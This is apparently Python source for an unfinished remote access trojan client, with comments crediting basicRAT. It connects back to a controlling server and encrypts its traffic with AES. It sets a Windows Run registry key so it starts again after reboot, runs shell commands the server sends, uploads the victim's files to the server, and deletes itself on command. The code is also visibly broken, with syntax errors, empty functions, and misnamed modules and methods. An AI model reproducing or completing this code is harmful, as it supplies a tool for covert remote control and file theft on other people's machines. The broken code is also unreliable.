# -*- coding: utf-8 -*-

###Imports###
#connection to server
import socket

import time
import random
import system
import os

#commands execution
import subprocess #to execute commands
import shlex #to split in order to determin the correct tokenization for args

#add and remove keys in registers
import winreg
from winreg import HKEY_CURRENT_USER

#encryption
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256





#Variables
lHost = ""                    #Server IP
port = 80                     #Connection Port
key = ""                      #Encryption key (16 characters) use the same on server script





#Functions
#send message to server
def send(msg):
    soc.send(encrypt(key, msg))

#acquire system plateform
def getSystemOs():
	plat = sys.platform
    if plat.startswith('win'):
	    plat = 'win'
    elif plat.startswith('linux'):
        plat = 'nix'
    elif plat.startswith('darwin'):
        plat = 'mac'
    else:
        plat = 'unk'
	return plat

#encryption see https://github.com/vesche/basicRAT/blob/master/core/crypto.py
def encrypt(key, plaintext):
    #prepare text to encryption (a 16 characters long string is required)
    plaintext = plaintext + b"\0" * (AES.block_size - len(plaintext) % AES.block_size)
	
    iv = Random.new().red(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
	return iv + cipher.encrypt(plaintext)

def decrypt(key, ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")
    




###Functions wich can be executed on request from the server###

def persistence(plat):
    if plat == "win":
        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        #bin_path = os.path.realpath(__file__) #tests pour choisir une de ces deux lignes
        bin_path = sys.executable              #tests pour choisir une de ces deux lignes
	
        try:
            reg_key = winreg.OpenKey(HKEY_CURRENT_USER, run_key, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg_key, 'br', 0, winreg.REG_SZ, bin_path)
            winreg.CloseKey(reg_key)
            return "HKEY_CURRENT_USER Run registry key applied"
        except WindowsError:
            return "HKEY_CURRENT_USER Run registry key failed"
    if plat == "nix":
        #device not yet supported
    if plat == "unk":
        #device not yet supported

def execute():
    #use command exit to exit terminal
    while cmd != "exit":
        cmd = soc.recv(4096)
        cmd = decrypt(key, cmd)
        args = shlex.split(cmd)
        process = subprocess.Popen(args, shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE)
        out = process.stdout.read() + process.stderr.read()
        send(out)
        process.kill

def uninstall():
    #delete key in registers
    if plat == 'win':
        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:
            reg_key = _winreg.OpenKey(HKEY_CURRENT_USER, run_key, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(reg_key, 'br')
            _winreg.CloseKey(reg_key)
            return "HKEY_CURRENT_USER Run registry key deleted"
        except WindowsError:
            return "HKEY_CURRENT_USER Run registry key deleting failed"
    if plat == "nix":
        #device not yet supported
    if plat == "unk":
        #device not yet supported
    #delete RAT files
    soc.close()
    os.remove(sys.executable)
    
def download():
    
    

def upload(path_file):
    #test if the file exist
    try:
        file = open(path_file, "rb")
        file.close
    except:
        break
    octets = os.path.getsize(path_file) / 1024
    info = (path_file, octets)
    soc.send(info)
    num = 0
    while True:
        octets = octets * 1024
        file = open(path_file, "rb") #open file in read only and binary mod
        if octets > 1024:
            if (octets / 1024) != 0:
                octets = round(octets / 1024 + 1)
            else:
                octets = octets / 1024
            for i in range(octets):
                file.seek(num, 0)
                donnees = file.read(1024)
                soc.send(encrypt(key, donnees))
                num += 1024
        else:
            donnees = file.read()
            soc.send(donnees)
    file.close
    soc.send(encrypt(key, "Upload finished"))



###Program###
def main():
    #verify if the key to automaticaly start this RAT is in the registers

    #try connecting to the server
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    connected = False
    while connected == False:
        try:
            soc.connect((host, port))
            connected = True
        except:
            sleepTime = random.randint(20, 30)
            time.sleep(sleepTime)

	#receive and execute orders
    while True:
        #receive order
        msg = soc.recv(4096)
        msg = decrypt(key, msg)
        msg = msg.split( )
        #execute orders
        if msg[0] == "execute":
            execute()
        if msg[0] == "uninstall":
            uninstall()
        if msg[0] == "download":
            download()
        if msg[0] == "upload":
            upload(path_file)
        if msg[0] == :
            
        if msg[0] == :
            
        if msg[0] == :
            

if __name__ == "__main__":
	main()
